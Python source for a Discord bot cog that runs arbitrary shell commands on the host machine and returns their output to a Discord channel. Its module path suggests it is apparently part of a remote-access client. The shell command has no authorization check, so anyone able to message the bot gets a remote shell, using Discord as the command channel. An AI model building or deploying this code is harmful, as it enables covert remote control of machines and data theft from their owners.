import os
import subprocess
import asyncio
import discord
from discord.ext import commands
from src.client.core.platform import Platform

class Shell(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.current_dir = os.getcwd()

    def get_shell_info(self):
        if Platform.is_windows():
            # Try PowerShell first, fallback to CMD
            return ["powershell.exe", "-Command"]
        else:
            # Linux/macOS
            return ["/bin/bash", "-c"]

    @commands.command(name="shell", aliases=["sh", "cmd"], help="Execute a shell command on the remote machine.")
    async def execute_shell(self, ctx, *, command: str):
        try:
            # Special handling for 'cd' command
            if command.startswith("cd "):
                new_path = command[3:].strip().strip('"')
                # Handle absolute and relative paths
                potential_path = os.path.join(self.current_dir, new_path)
                if os.path.isdir(potential_path):
                    self.current_dir = os.path.abspath(potential_path)
                    os.chdir(self.current_dir)
                    await ctx.send(f"📁 Changed directory to: `{self.current_dir}`")
                elif os.path.isdir(new_path):
                    self.current_dir = os.path.abspath(new_path)
                    os.chdir(self.current_dir)
                    await ctx.send(f"📁 Changed directory to: `{self.current_dir}`")
                else:
                    await ctx.send(f"❌ Directory not found: `{new_path}`")
                return

            shell_cmd = self.get_shell_info()
            
            # Execute command asynchronously
            process = await asyncio.create_subprocess_shell(
                command,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                cwd=self.current_dir
            )

            stdout, stderr = await process.communicate()
            
            output = stdout.decode('utf-8', errors='replace')
            error = stderr.decode('utf-8', errors='replace')

            full_output = output + error
            
            if not full_output.strip():
                await ctx.send("✅ Command executed with no output.")
                return

            # Handle Discord's 2000 character limit
            if len(full_output) > 1900:
                with open("output.txt", "w", encoding="utf-8") as f:
                    f.write(full_output)
                await ctx.send("📄 Output is too long, sending as file:", file=discord.File("output.txt"))
                os.remove("output.txt")
            else:
                await ctx.send(f"```\n{full_output}\n```")

        except Exception as e:
            await ctx.send(f"❌ Shell Error: {str(e)}")

    @commands.command(name="pwd", help="Show current working directory.")
    async def show_pwd(self, ctx):
        await ctx.send(f"📍 Current Directory: `{os.getcwd()}`")

async def setup(bot):
    await bot.add_cog(Shell(bot))
